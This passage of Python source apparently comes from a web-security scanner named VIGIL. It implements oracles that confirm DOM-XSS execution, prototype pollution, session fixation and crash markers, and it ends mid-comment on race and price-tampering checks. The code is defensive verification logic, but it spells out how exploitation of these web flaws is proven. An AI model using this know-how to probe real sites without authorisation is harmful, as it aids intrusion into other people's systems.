    (re.compile(r"WARNING:\s*ThreadSanitizer|data race"), "tsan", 0.88),
    (re.compile(r"runtime error:.*(overflow|out of bounds|null pointer|misaligned)"), "ubsan", 0.85),
    (re.compile(r"UndefinedBehaviorSanitizer"), "ubsan", 0.85),
    (re.compile(r"LeakSanitizer|detected memory leaks"), "lsan", 0.75),
    (re.compile(r"\*\*\* stack smashing detected \*\*\*"), "stack-protector", 0.9),
    (re.compile(r"double free or corruption|malloc\(\): |free\(\): "), "glibc-abort", 0.85),
    (re.compile(r"thread '.*' panicked at"), "rust-panic", 0.85),
    (re.compile(r"^panic:", re.MULTILINE), "go-panic", 0.8),
    (re.compile(r"Segmentation fault|SIGSEGV|SIGABRT|core dumped"), "signal", 0.8),
    (re.compile(r"Traceback \(most recent call last\):"), "py-traceback", 0.65),
]


def sanitizer_signal_oracle(process_output: Any) -> OracleSignal:
    """Scan captured stdout/stderr for sanitizer, panic, abort and traceback
    markers. A single unambiguous crash marker fires; a bare Python traceback
    fires only at moderate confidence (it can be an ordinary handled error)."""
    text = _coerce_text(process_output)
    matches: list[dict[str, Any]] = []
    for pattern, label, conf in _SANITIZER_PATTERNS:
        m = pattern.search(text)
        if m:
            line = _line_of(text, m.start())
            matches.append({"label": label, "confidence": conf,
                            "match": m.group(0), "line": line})

    if not matches:
        return OracleSignal(
            kind=OracleKind.SANITIZER_SIGNAL, fired=False, confidence=0.0,
            evidence="no sanitizer/crash/panic marker in output", observed={})

    best = max(matches, key=lambda x: x["confidence"])
    return OracleSignal(
        kind=OracleKind.SANITIZER_SIGNAL,
        fired=True,
        confidence=best["confidence"],
        evidence=f"{best['label']} marker: {best['line'].strip()[:200]}",
        observed={"matches": matches, "best": best["label"]},
    )


def _line_of(text: str, offset: int) -> str:
    start = text.rfind("\n", 0, offset) + 1
    end = text.find("\n", offset)
    return text[start: end if end >= 0 else len(text)]


# ---------------------------------------------------------------------------
# 3d. DOM execution — injected JS actually ran in a real DOM (DOM-XSS)
# ---------------------------------------------------------------------------


def dom_execution_oracle(binding_calls: Any, canary: str) -> OracleSignal:
    """Fire when a unique canary appears among the arguments the page passed to a
    CDP binding — proof that injected JavaScript **executed** in a real browser
    DOM, not merely that a marker was reflected.

    This is the strongest possible XSS evidence and is near-unforgeable: the
    binding is a function only the driver registered (Runtime.addBinding), and the
    only way its call carrying the canary appears is if the injected script ran and
    invoked it. A reflected-but-inert payload, an encoded payload, or a page that
    never executes the sink all produce no binding call and correctly do not fire.
    The canary must be non-trivial so an incidental value cannot masquerade as one."""
    canary = (canary or "").strip()
    calls = [_coerce_text(c) for c in (binding_calls or [])]

    if len(canary) < 6:
        return OracleSignal(
            kind=OracleKind.DOM_EXECUTION, fired=False, confidence=0.0,
            evidence="execution canary too short to be a reliable, unforgeable marker",
            observed={"canary": canary})

    hit = next((c for c in calls if canary in c), None)
    if hit is None:
        return OracleSignal(
            kind=OracleKind.DOM_EXECUTION, fired=False, confidence=0.0,
            evidence="no binding call carried the execution canary; injected script did not run",
            observed={"canary": canary, "call_count": len(calls)})

    return OracleSignal(
        kind=OracleKind.DOM_EXECUTION,
        fired=True,
        confidence=0.97,
        evidence=f"injected script executed in the DOM and invoked the callback with {canary!r}",
        observed={"canary": canary, "call": hit[:200]},
    )


# ---------------------------------------------------------------------------
# 3b. Prototype pollution — Object.prototype was ACHIEVEDLY polluted in a real DOM
# ---------------------------------------------------------------------------


_PP_KEY_RE = re.compile(r"^cpp_[0-9a-f]{8,}$")   # VIGIL per-probe pollution-KEY canary (scanner.proto_pollution mints cpp_<token_hex>)
_PP_VAL_RE = re.compile(r"^ppv_[0-9a-f]{8,}$")   # VIGIL per-probe pollution-VALUE canary (ppv_<token_hex>)


def prototype_pollution_oracle(observed: Any) -> OracleSignal:
    """Fire when a real headless DOM's ACHIEVED runtime state proves client-side prototype
    pollution: ``Object.prototype[uniqKey] === uniqVal`` for the unique per-probe key/value a
    ``__proto__[uniqKey]=uniqVal`` gadget drove in, AND a BENIGN-KEY control (a different key
    that was NEVER injected) stayed ``undefined``.

    ``observed`` is the binding-reported readback a driver captured after rendering the target
    page — a mapping ``{polluted_key, polluted_val, expected_val, benign_key,
    benign_key_undefined}``. The oracle judges the ACHIEVED STATE, never that the payload merely
    appeared: a page that reflects the key into the DOM but does NOT assign it onto
    ``Object.prototype`` reports ``polluted_val`` absent/mismatched and does not fire.

    Near-zero-FP by three independent guards:
      * the key AND value must match VIGIL's own per-probe canary SHAPE (``cpp_<hex>`` /
        ``ppv_<hex>``, minted by ``scanner.proto_pollution`` via ``secrets.token_hex``). This is a
        SELF-CONTAINED guard: the oracle's standalone re-fire (its certificate) can therefore
        NEVER be satisfied by a pre-existing NAMED prototype property (``toString``,
        ``hasOwnProperty``, ``constructor``) or any arbitrary key — a match can only be the
        high-entropy marker VIGIL drove in, so soundness does not depend on the upstream caller;
      * the value must reproduce EXACTLY (``polluted_val == expected_val``) — a truthy-but-
        different value (a page that sets its own default) does not fire;
      * the BENIGN-KEY control must be ``undefined`` — if some ambient gadget polluted the
        prototype independently of this probe, ``benign_key_undefined`` is False and the oracle
        REFUSES to attribute (an ambient-pollution page does not fire).

    This is the client-side ACHIEVED-STATE FACT (CWE-1321), not a posture check: a fire means
    VIGIL observed ``Object.prototype`` actually carry the value it drove in."""
    obs = observed if isinstance(observed, Mapping) else {}
    key = _coerce_text(obs.get("polluted_key")).strip()
    expected = _coerce_text(obs.get("expected_val")).strip()
    got_raw = obs.get("polluted_val")
    got = _coerce_text(got_raw).strip() if got_raw is not None else ""
    benign_key = _coerce_text(obs.get("benign_key")).strip()
    benign_undef = obs.get("benign_key_undefined")

    base = {"polluted_key": key, "benign_key": benign_key}

    # SELF-CONTAINED SOUNDNESS: the key/value must match VIGIL's own per-probe canary SHAPE
    # (scanner.proto_pollution mints ``cpp_<hex>`` / ``ppv_<hex>``). Requiring the shape here — not
    # merely a length floor — means the oracle's STANDALONE re-fire (its certificate) cannot be
    # satisfied by a pre-existing NAMED prototype property (``toString``/``hasOwnProperty``/
    # ``constructor``) or any arbitrary key: a match can ONLY be the high-entropy marker VIGIL drove
    # in, so soundness never depends on the upstream caller being the sole key source.
    if not _PP_KEY_RE.match(key):
        return OracleSignal(
            kind=OracleKind.PROTOTYPE_POLLUTION, fired=False, confidence=0.0,
            evidence=("pollution key is not a VIGIL per-probe canary marker (expected cpp_<hex>) — an "
                      "arbitrary or pre-existing prototype property cannot mint this FACT"),
            observed=base)
    if not _PP_VAL_RE.match(expected):
        return OracleSignal(
            kind=OracleKind.PROTOTYPE_POLLUTION, fired=False, confidence=0.0,
            evidence="expected pollution value is not a VIGIL per-probe canary marker (expected ppv_<hex>)",
            observed=base)

    # The BENIGN-KEY control gates attribution: a different key that was NEVER injected MUST be
    # undefined. If it is not (ambient pollution, or a page that pollutes every key), refuse —
    # we cannot attribute the polluted state to THIS probe.
    if benign_undef is not True:
        return OracleSignal(
            kind=OracleKind.PROTOTYPE_POLLUTION, fired=False, confidence=0.0,
            evidence=("benign-key control was not undefined — cannot attribute the polluted state to this "
                      "probe (ambient / indiscriminate pollution); refusing"),
            observed={**base, "benign_key_undefined": benign_undef})

    # The ACHIEVED-STATE test: Object.prototype[key] must reproduce the exact value driven in.
    if got_raw is None or got != expected:
        return OracleSignal(
            kind=OracleKind.PROTOTYPE_POLLUTION, fired=False, confidence=0.0,
            evidence=("Object.prototype was not polluted to the expected value (the payload may have been "
                      "reflected without polluting the prototype); did not fire"),
            observed={**base, "expected_val": expected, "observed_val": got})

    return OracleSignal(
        kind=OracleKind.PROTOTYPE_POLLUTION,
        fired=True,
        confidence=0.96,
        evidence=(f"Object.prototype.{key} was polluted to {expected!r} in a real DOM "
                  f"(benign-key control {benign_key!r} stayed undefined)"),
        observed={"polluted_key": key, "polluted_val": expected, "benign_key": benign_key,
                  "benign_key_undefined": True},
    )


# ---------------------------------------------------------------------------
# 3c. Session fixation — a VIGIL-fixed pre-auth session id survives login (achieved-state, CWE-384)
# ---------------------------------------------------------------------------

# VIGIL per-run session-fixation SENTINEL id shape (scanner.session mints ``sfx_`` + ``token_hex(16)`` = 32
# lowercase-hex chars ⇒ 128 bits). Requiring this shape here — pinned to the actual 128-bit mint, not a loose
# 16-hex floor — makes the oracle's STANDALONE re-fire (its certificate) SELF-CONTAINED: a match can ONLY be
# the high-entropy id VIGIL chose and DROVE IN before authenticating, so the FACT can never be minted from a
# server-issued session value (which does not carry the marker). This is exactly the guard that distinguishes
# "the app honoured a client-fixed id" (the fixation weakness) from "the app issued its own id" (a server-set
# id degrades to a weaker LEAD, never this FACT).
_SFX_SENTINEL_RE = re.compile(r"^sfx_[0-9a-f]{32,}$")

# SIXTH-VARIANT SOUNDNESS — PRIVATE-READ REDUCTION (round-5 BLOCK, CRITICAL). SIX rounds proved that an
# achieved authenticated/accepted state CANNOT be proven from response CONTENT: a marker differential
# (``success_marker`` PRESENT-with-cookie / ABSENT-without) proves only that the COOKIE changed the response,
# NOT that the VIGIL-fixed id S0 AUTHENTICATED. A benign app that renders the operator ``success_marker``
# whenever ANY session cookie is present — the marker not derived from the sentinel, so the sentinel-substring
# guard misses it — defeats every such content/marker heuristic. So the ``success_marker`` differential is NO
# LONGER a minting path (a bare success-marker record is an honest LEAD).
#
# The SOUND reduction (the same machinery Wave-3.1 IDOR/BOLA uses): prove the achieved fixation state ONLY by
# an ACHIEVED READ OF A VICTIM-PRIVATE DATUM D. The fixed session S0 confirms the achieved state ONLY when a
# genuine operator-supplied victim-PRIVATE discriminator D satisfies ALL of:
#   (a) D is PRESENT in S0's SUBSTANTIVE read of the protected/victim resource;
#   (b) D is PRESENT in a SUBSTANTIVE POSITIVE reference — the owner's authoritative read — proving D is the
#       REAL private content, not chrome that merely appears whenever a credential is present;
#   (c) D is ABSENT from a SUBSTANTIVE SAME-SHAPE NEGATIVE reference — an OTHER-unauthorized-identity read
#       that returns a substantive 2xx RENDERING the same resource — AND ABSENT from a VALID no-session gating
#       baseline. A denial / empty / error / different-shape negative reference is REFUSED (its absent D is
#       vacuous) ⇒ fail closed to a LEAD. The other-identity SAME-SHAPE read is the DECISIVE clause: cosmetic
#       chrome shown for ANY credential appears there too (so D present ⇒ refused), which is exactly why a
#       no-session-ONLY differential (defeated by a credential-presence-varying app) can NEVER mint;
#   (d) D is a valid discriminator — non-trivial, not whitespace, not a substring of / straddling the VIGIL
#       sentinel S0 (the per-probe nonce), i.e. not reflected from the request (a cookie echo).
# The oracle RE-DERIVES this from the RETAINED RAW bytes at every (re-)verification — it never trusts a
# pre-computed bool — so a durable re-fire re-runs the same private-read differential offline and a benign
# credential-presence-varying app can never mint. Without an operator-supplied private D + BOTH references,
# the achieved state is undecidable ⇒ an honest LEAD (never a false FACT, never a false CLEAN).
_SFX_MIN_MARKER = 3          # a marker below this is trivially a substring of almost any body
_SFX_MIN_BODY = 16           # a real page body, not a stub/error token — so marker-ABSENCE is meaningful
_SFX_MAX_ERROR_BODY = 96     # a short body dominated by a canonical error/deny phrase is an error page
_SFX_DEFAULT_LOGGED_OUT_STATUSES = frozenset({401, 403})
_SFX_TAG_RE = re.compile(r"<[^>]+>")
_SFX_WS_RE = re.compile(r"\s+")
# A start-anchored error/deny opener: a body that OPENS with one of these is an error/deny page, not a
# substantive access-gated view — so it can neither prove authentication NOR serve as a differential
# reference (a marker "absent" from an error page is absent because the page errored, proving nothing).
_SFX_ERROR_OPENER_RE = re.compile(r"^(errors?\b|forbidden\b|unauthori[sz]ed\b|denied\b|[45]\d\d\b)")
# Canonical server-error / access-denied phrases. A SHORT body dominated by one of these is an error page
# even when it does not OPEN with the token (e.g. "Internal Server Error rendering <marker> account") — so a
# crash that merely echoes the marker string cannot be scored an authenticated view. Deliberately specific
# (multi-word / status-line shaped) so a real authenticated page that mentions "error" in prose, and a normal
# logged-out page, are never misclassified.
_SFX_ERROR_SIGNATURES: tuple[str, ...] = (
    "internal server error", "500 internal server error",
    "service unavailable", "service temporarily unavailable", "temporarily unavailable",
    "bad gateway", "gateway timeout", "bad request",
    "not found", "page not found", "404 not found", "403 forbidden",
    "access denied", "access is denied", "access blocked", "request blocked",
    "an error occurred", "an error has occurred", "an unexpected error", "something went wrong",
)


def _sfx_status_set(statuses: Any) -> "frozenset[int]":
    out: set[int] = set()
    if isinstance(statuses, (list, tuple, set, frozenset)):
        for s in statuses:
            try:
                out.add(int(s))
            except (TypeError, ValueError):
                continue
    return frozenset(out) if out else _SFX_DEFAULT_LOGGED_OUT_STATUSES


def _sfx_substantive_body(status: Any, body: str) -> bool:
    """A response usable in the differential — a real 2xx with a non-trivial body that is not itself an
    error/deny page. A response FAILING this proves NOTHING (it can neither score authenticated NOR serve as
    a negative reference whose marker-absence is meaningful), so the caller FAILS CLOSED to a LEAD."""
    try:
        code = int(status)
    except (TypeError, ValueError):
        return False
    if not (200 <= code < 300):
        return False
    raw = body or ""
    if len(raw.strip()) < _SFX_MIN_BODY:
        return False
    text = _SFX_WS_RE.sub(" ", _SFX_TAG_RE.sub(" ", raw)).strip().lower()
    if not text:
        return False
    if _SFX_ERROR_OPENER_RE.match(text):
        return False
    if len(text) <= _SFX_MAX_ERROR_BODY and any(sig in text for sig in _SFX_ERROR_SIGNATURES):
        return False
    return True


# A genuine authorization DENIAL (a no-session baseline can prove the datum is gated by DENYING access) at
# these statuses — as opposed to a bare error (5xx / empty / network / 404) whose absent D is vacuous. A
# denial still has to SAY something (a real deny body) to count; the floor is below a real deny message.
_SFX_DENIAL_STATUSES = frozenset({401, 403})
_SFX_MIN_DENIAL_BODY = 3


def _sfx_nocred_baseline_valid(status: Any, body: str) -> bool:
    """A no-session (logged-out) gating baseline is a VALID proof the datum is authorization-gated — its
    ``not-contains(D)`` is meaningful — ONLY when it is EITHER a SUBSTANTIVE 2xx read of the resource (the
    datum is gated at the record level) OR a GENUINE 401/403 authorization DENIAL carrying a real (non-empty)
    deny body (access requires credentials). A bare 5xx / empty / 404 / body-less denial proves NOTHING (its
    absent D is vacuous) ⇒ INVALID, and the caller fails closed to a LEAD."""
    if _sfx_substantive_body(status, body):
        return True
    try:
        code = int(status)
    except (TypeError, ValueError):
        return False
    return code in _SFX_DENIAL_STATUSES and len(_coerce_text(body).strip()) >= _SFX_MIN_DENIAL_BODY


def _sfx_private_read_achieved(discriminator: Any, authorized: Any, owner_view: Any, unauth_ref: Any,
                               logged_out_ref: Any, logged_out_markers: Any, logged_out_statuses: Any,
                               *, sentinel_id: str = "") -> "bool | None":
    """Re-derive, from the RETAINED RAW bytes, whether the VIGIL-fixed id S0's post-login read of the
    protected/victim resource ACHIEVED a read of a victim-PRIVATE datum ``D`` — the ONLY SOUND proof of the
    achieved fixation state. An authenticated/accepted state CANNOT be proven from response CONTENT (six
    rounds proved every marker / same-shape / credential-presence heuristic is defeated by a benign app whose
    response merely VARIES by credential presence), so this NEVER scores a body and never trusts a bool.
    TRI-STATE:

      * ``True``  — D is a valid, non-reflected discriminator PRESENT in S0's SUBSTANTIVE read (a), PRESENT in
        the owner's authoritative SUBSTANTIVE read (b), ABSENT from a SUBSTANTIVE SAME-SHAPE 2xx read by an
        OTHER unauthorized identity (c, DECISIVE) AND ABSENT from a VALID no-session gating baseline (c) ⇒ S0
        reached the victim's PRIVATE view ⇒ a live fixed session;
      * ``False`` — S0 is DECISIVELY not authenticated: a logged-out status / operator logged-out marker on
        S0's read, OR — with the full differential validated — D ABSENT from S0's otherwise-substantive read
        (S0 rendered the resource but NOT the victim's private datum, like the unauthorized peer);
      * ``None``  — undecidable ⇒ FAIL CLOSED to a LEAD: no / invalid D; D reflects / straddles the sentinel
        (a cookie echo); S0's read is not a substantive success; NO substantive owner (positive) reference or
        D absent from it (D not proven private); NO substantive SAME-SHAPE other-identity reference (a
        denial / empty / error / different-shape is REFUSED); NO valid no-session baseline; or D PRESENT in a
        negative reference (chrome / shared / public — not victim-private)."""
    s0 = _coerce_text(sentinel_id).strip()
    d = _coerce_text(discriminator).strip()
    if not isinstance(authorized, Mapping):
        return None
    a_status = authorized.get("status")
    a_body = _coerce_text(authorized.get("body"))
    # DECISIVE logged-out signals on S0's read DISPROVE auth (channel-confirmed not-authenticated), no D
    # needed: an explicit logged-out status or an operator-supplied logged_out_marker.
    try:
        a_code = int(a_status)
    except (TypeError, ValueError):
        a_code = 0
    if a_code in _sfx_status_set(logged_out_statuses):
        return False
    lo_markers = [t for t in (_coerce_text(x).strip() for x in (logged_out_markers or ())) if t]
    if any(t in a_body for t in lo_markers):
        return False
    # (d) VALID DISCRIMINATOR. D must be non-trivial and must NOT discriminate VIGIL's OWN injected id: the
    # sentinel S0 is the per-probe nonce, so a D that is a SUBSTRING of it is a reflected cookie echo, not
    # access-gated content (mirrors scanner.session.valid_discriminator(D, nonce=S0)). ⇒ undecidable.
    if len(d) < _SFX_MIN_MARKER:
        return None
    if s0 and d in s0:
        return None
    # S0's read must ITSELF be a SUBSTANTIVE success to carry an achieved private read (empty / too-short /
    # error-or-deny 2xx proves nothing) ⇒ undecidable.
    if not _sfx_substantive_body(a_status, a_body):
        return None
    # STRADDLE / reflected-sentinel guard: even a D not WHOLLY inside S0 is a cookie-echo artifact when it
    # OVERLAPS S0 in the echoed body. Mask every occurrence of the fixed sentinel; if D's presence in S0's
    # body vanishes, its presence was the cookie echo — not access-gated content ⇒ undecidable. (S0's read is
    # the ONLY leg carrying Cookie: <name>=S0, so this is the reflected-from-request guard for (d).)
    if s0 and s0 in a_body and d in a_body and d not in a_body.replace(s0, "\x00"):
        return None
    # (b) POSITIVE reference — the owner's authoritative read MUST be a substantive success and MUST CONTAIN
    # D, proving D is the REAL victim-private content (not chrome that appears whenever a credential is
    # present). No substantive owner read, or D absent from it ⇒ D is not validated as private ⇒ undecidable.
    if not isinstance(owner_view, Mapping):
        return None
    o_body = _coerce_text(owner_view.get("body"))
    if not _sfx_substantive_body(owner_view.get("status"), o_body):
        return None
    if d not in o_body:
        return None
    # (c) DECISIVE SAME-SHAPE negative reference — an OTHER unauthorized identity's read of the SAME resource
    # that MUST be a SUBSTANTIVE SAME-SHAPE 2xx (a real render of the resource, NOT a denial / empty / error /
    # different shape). D MUST be ABSENT. This is the ONLY reference a benign credential-presence-varying app
    # cannot fool: cosmetic chrome shown for ANY credential appears here too (D present ⇒ refused); a real
    # datum gated to the victim identity does not. A non-substantive-same-shape reference is REFUSED (its
    # absent D is vacuous). NO such reference ⇒ undecidable — a no-session-ONLY differential is defeated by a
    # credential-presence-varying app, so it can never mint.
    if not isinstance(unauth_ref, Mapping):
        return None
    u_body = _coerce_text(unauth_ref.get("body"))
    if not _sfx_substantive_body(unauth_ref.get("status"), u_body):
        return None
    if d in u_body:
        return None   # present for another identity ⇒ chrome / shared / not victim-private ⇒ undecidable
    # (c) no-session GATING baseline — a VALID gating proof (a substantive 2xx that lacks D, or a genuine
    # 401/403 denial with a real body). D present in a SUBSTANTIVE no-session read ⇒ D is public ⇒ undecidable.
    if not isinstance(logged_out_ref, Mapping):
        return None
    l_status = logged_out_ref.get("status")
    l_body = _coerce_text(logged_out_ref.get("body"))
    if not _sfx_nocred_baseline_valid(l_status, l_body):
        return None
    if _sfx_substantive_body(l_status, l_body) and d in l_body:
        return None
    # The full SAME-SHAPE private-read differential is established and D is a proven victim-PRIVATE
    # discriminator. POSITIVE achieved read: D present in S0's substantive read ⇒ S0 reached the victim's
    # private view ⇒ True. D ABSENT from S0's otherwise-substantive read ⇒ S0 rendered the resource but did
    # NOT reach the private datum (like the unauthorized peer) ⇒ False (channel-confirmed clean).
    return d in a_body


def _sfx_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.92,
                conclusive: bool = False) -> OracleSignal:
    # kind is the DEDICATED OracleKind.SESSION_FIXATION (held OUT of the frozen _ALL_ORACLES, so
    # oracle_version(ACHIEVED_STATE) is untouched and the unknown-class fallback stays EXACTLY 15). A fire is
    # always decisive; a NON-fire is ``conclusive`` ONLY for a channel-confirmed clean (a rotated+dead or an
    # unrotated+not-authenticated fixed id) — an undecidable / disqualified-differential / server-set / bare
    # shape non-fire is a LEAD (conclusive=False), never a CLEAN.
    return OracleSignal(kind=OracleKind.SESSION_FIXATION, fired=fired,
                        confidence=(conf if fired else 0.0),
                        conclusive=(True if fired else conclusive),
                        evidence=evidence, observed=observed)


def session_fixation_oracle(observed: Any) -> OracleSignal:
    """Fire when a VIGIL-fixed PRE-AUTH session id SURVIVES the operator's login sequence unrotated AND
    achieves a read of a victim-PRIVATE datum — the ACHIEVED-STATE proof of session fixation (CWE-384),
    proven by the PRIVATE-READ REDUCTION (an achieved authenticated state cannot be proven from response
    content; see :func:`_sfx_private_read_achieved`), re-derived from RAW retained bytes (never a bool).

    ``observed`` is the retained record ``scanner.session.SessionFixationCheck`` captured through the gated
    ``send``:

      * ``sentinel_id`` (S0) — the UNIQUE high-entropy id VIGIL chose and set as the session cookie BEFORE
        the login sequence (the attacker-fixed id); MUST match VIGIL's per-run sentinel shape ``sfx_<hex>``;
      * ``post_auth_id`` (S1) — the session-cookie value in effect AFTER login;
      * ``private_discriminator`` (D) — the operator's genuine victim-PRIVATE datum (the achieved-state proof);
      * ``authorized_view`` — ``{status, body}`` of the protected URL fetched carrying the VIGIL-fixed id S0
        AFTER login (S0's read);
      * ``owner_view`` — ``{status, body}`` of the SAME URL read authoritatively as the owner/victim (the
        POSITIVE reference: D must be PRESENT, proving D is real private content);
      * ``unauth_ref`` — ``{status, body}`` of the SAME URL read by an OTHER unauthorized identity (the
        DECISIVE SAME-SHAPE negative reference: a substantive 2xx from which D must be ABSENT);
      * ``logged_out_ref`` — ``{status, body}`` of the SAME URL with NO session cookie (the no-session gating
        baseline: D absent from a valid — substantive-2xx-or-genuine-denial — read);
      * ``logged_out_markers`` / ``logged_out_statuses`` — the operator's decisive not-authenticated signals;
      * ``success_marker`` — LEGACY; a bare success-marker differential is NO LONGER a minting path (six
        rounds proved it is defeated by a benign app whose response varies by credential presence), so it is
        NOT used to prove the achieved state — only ``logged_out_markers`` still drive the not-authenticated
        determination.

    Adjudication (a bare ``authenticated_after_login`` bool, if present, is IGNORED — the oracle re-derives):

      * ``sentinel_id`` not the ``sfx_<hex>`` shape ⇒ a server-issued id cannot mint this FACT — LEAD;
      * ``post_auth_id`` missing ⇒ INCONCLUSIVE;
      * :func:`_sfx_private_read_achieved` is ``None`` (no / invalid / reflected D; a non-substantive S0 read;
        no substantive owner (positive) reference or D absent from it; no substantive SAME-SHAPE other-identity
        reference; no valid no-session baseline; or D present in a negative reference) ⇒ LEAD (never a FACT,
        never a false CLEAN);
      * the id was ROTATED at login (``post_auth_id != sentinel_id``): S0 DEAD ⇒ channel-confirmed CLEAN
        (the correct defense); S0 STILL LIVE ⇒ INCONCLUSIVE (a value rotation alone does not prove S0 was
        invalidated, and a live-S0 rotated record is indistinguishable from a hand-forged rotation — never a
        false CLEAN, never a FACT);
      * survived UNROTATED but S0 did not achieve the private read ⇒ channel-confirmed CLEAN;
      * survived UNROTATED AND the private-read differential proves S0 reached the victim's private view ⇒ FIRE.

    Pure + deterministic; never raises."""
    obs = observed if isinstance(observed, Mapping) else {}
    sentinel = _coerce_text(obs.get("sentinel_id")).strip()
    post_auth_raw = obs.get("post_auth_id")
    post_auth = _coerce_text(post_auth_raw).strip() if post_auth_raw is not None else ""
    cookie_name = _coerce_text(obs.get("cookie_name")).strip()
    discriminator = _coerce_text(obs.get("private_discriminator")).strip()
    base = {"cookie_name": cookie_name, "sentinel_id_shape_ok": bool(_SFX_SENTINEL_RE.match(sentinel))}

    # SELF-CONTAINED SOUNDNESS: the fixed id must be VIGIL's own per-run sentinel. A server-issued id can NEVER
    # be the id VIGIL drove in — so this FACT provably rests on an id VIGIL fixed, and a server-set-only id is
    # NOT rounded to a FACT. Non-conclusive (a weaker LEAD, per the plan).
    if not _SFX_SENTINEL_RE.match(sentinel):
        return _sfx_signal(
            False, observed=base,
            evidence=("fixed session id is not a VIGIL per-run sentinel (expected sfx_<hex>) — a server-issued "
                      "id cannot mint this FACT; the app did not honour a client-fixed id (degrades to a LEAD)"))

    # No post-auth id observed ⇒ no channel-confirmed observation of the login's effect ⇒ INCONCLUSIVE.
    if post_auth_raw is None or not post_auth:
        return _sfx_signal(
            False, observed=base,
            evidence="no post-authentication session id was observed — cannot adjudicate fixation (inconclusive)")

    # RE-DERIVE the achieved state from RAW retained bytes via the PRIVATE-READ REDUCTION — never a bool, never
    # a bare success-marker differential. None ⇒ undecidable (no/invalid/reflected D, non-substantive S0 read,
    # missing/failing positive owner reference, missing/non-substantive-same-shape other-identity reference,
    # missing/invalid no-session baseline, or D present in a negative reference) ⇒ LEAD.
    s0_auth = _sfx_private_read_achieved(discriminator, obs.get("authorized_view"), obs.get("owner_view"),
                                         obs.get("unauth_ref"), obs.get("logged_out_ref"),
                                         obs.get("logged_out_markers"), obs.get("logged_out_statuses"),
                                         sentinel_id=sentinel)
    if s0_auth is None:
        return _sfx_signal(
            False, observed={**base, "discriminator_len": len(discriminator)},
            evidence=("the fixed id's achieved state could not be proven by the PRIVATE-READ differential (no "
                      "valid victim-private discriminator D; D reflects/straddles the VIGIL-fixed sentinel — a "
                      "cookie echo, not access-gated content; a non-substantive S0 read; no substantive owner "
                      "positive reference or D absent from it; no substantive SAME-SHAPE other-identity "
                      "reference — a denial/empty/error/different-shape is refused; no valid no-session "
                      "baseline; or D present in a negative reference — chrome/shared/public) — cannot mint (LEAD)"))

    # The session-cookie VALUE was ROTATED at login (S1 != S0). Rotation ALONE is NOT proof of defense: an app
    # can rotate the value yet leave the pre-auth-fixed id S0 valid (a real fixation). Only the differential
    # showing S0 is DEAD is a channel-confirmed clean; a still-LIVE S0 under a rotated value is
    # indistinguishable from a hand-forged rotation in the retained record ⇒ refuse to clear AND to mint.
    if post_auth != sentinel:
        if s0_auth is True:
            return _sfx_signal(
                False, observed={**base, "rotated": True, "s0_authenticated": True},
                evidence=("session-cookie value was ROTATED at login yet the VIGIL-fixed pre-auth id still "
                          "reaches the victim's private view (proven by the private-read differential) — a value "
                          "rotation does not by itself prove the fixed id was invalidated; cannot conclusively "
                          "clear (inconclusive)"))
        return _sfx_signal(
            False, conclusive=True, observed={**base, "rotated": True, "s0_authenticated": False},
            evidence=("session id was ROTATED at login and the VIGIL-fixed pre-auth id no longer reaches the "
                      "victim's private view — the app defends against fixation; did not fire"))

    # The fixed id survived unrotated but did not achieve the private read ⇒ no fixation risk. Confirmed clean.
    if s0_auth is not True:
        return _sfx_signal(
            False, conclusive=True, observed={**base, "s0_authenticated": False},
            evidence=("the VIGIL-fixed id survived login unrotated but did not reach the victim's private view "
                      "(the private datum D is absent from its read, present for the owner) — not a live fixed "
                      "session; did not fire"))

    return _sfx_signal(
        True, conf=0.92,
        evidence=(f"session fixation: the VIGIL-fixed pre-auth id {sentinel!r} SURVIVED the login sequence "
                  f"(post-auth id is identical) AND achieved a read of a victim-PRIVATE datum — the private "
                  f"discriminator D is PRESENT in S0's read AND in the owner's authoritative read yet PROVABLY "
                  f"ABSENT from a SUBSTANTIVE SAME-SHAPE read by an OTHER unauthorized identity and from a "
                  f"no-session baseline (the private-read differential proves S0 reached the victim's gated "
                  f"content) — the app adopted an attacker-fixable session id at authentication"),
        observed={"sentinel_id": sentinel, "post_auth_id": post_auth, "cookie_name": cookie_name,
                  "s0_authenticated": True, "differential": "private_datum_present_in_fixed_session_and_owner_"
                  "reads_absent_in_same_shape_other_identity_and_no_session_references"})


# ---------------------------------------------------------------------------
# 4a-bis. Workflow abuse — race limit-overrun (COUNT-based) and business-logic /
#         price-manipulation (a danger predicate over the observed post-state),
#         BOTH gated behind the OWNER-SIGNED WorkflowSpec (Wave-4.4).
# ---------------------------------------------------------------------------
#
# The WorkflowSpec AST is the operator-declared intent, cryptographically OWNER-SIGNED at the
# gateway (the 0.3 owner-signed per-action approval / owner-signed workflow.json). That Ed25519
# verification happens in the RUNNER (integration env, live/race_bizlogic_redrive.py) BEFORE any
# state-changing step — it CANNOT happen here (FATAL-2: this engine module imports no vigil_core /
# gateway), so the runner re-asserts the verified fact as ``owner_signed_spec: true`` in the
# RETAINED record, which the evidence certificate binds (a tampered attestation breaks the cert at
# re-verify). WITHOUT that attestation the oracle emits NO achieved_state for ANY input —
# INCONCLUSIVE, never a false CLEAN and never a FACT (mirrors the Wave-3.4 certification gate).
#
# RACE (mode="race"): the verdict is COUNT-based, NEVER timing. A should-be-atomic action permitted
# at most ``max_allowed`` time(s) must not commit more than that no matter how many concurrent
# requests hit its check-then-act window. The oracle RE-DERIVES the success count from the RETAINED
# RAW burst responses by RE-EVALUATING the operator-declared SEMANTIC ``success_predicate`` over EACH
# response (never a trusted bare integer) and fires iff successes > max_allowed. A12: a bare any-2xx
# count does NOT prove over-CONSUMPTION (a benignly-idempotent endpoint returns 2xx to every
# concurrent request), so WITHOUT a semantic success_predicate the over-count is a LEAD, never a FACT.
# successes<=max_allowed over a semantic predicate is a channel-confirmed CLEAN (properly locked).
#
# TAMPER (mode="tamper"): price/quantity parameter tampering. The oracle evaluates the operator-
# declared ``danger`` predicate (a pure JSON AST) over the RETAINED observed post-state and fires iff
# it holds — the tampered value landed in a dangerous persisted state. A correctly-priced / validating
# flow (the benign twin) fails the predicate ⇒ channel-confirmed CLEAN. Timing is never consulted.

_WORKFLOW_MODES = ("race", "tamper")


def _workflow_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.9,
                     conclusive: bool = False) -> OracleSignal:
    # kind is the FROZEN ACHIEVED_STATE (already in _ALL_ORACLES — this adds NO new OracleKind and
    # oracle_version(ACHIEVED_STATE) is byte-identical, mirroring csrf_achieved_oracle): reachable ONLY
    # via the fresh `workflow_abuse` ctx key no benchmark/scan/engage finding carries. A fire is always
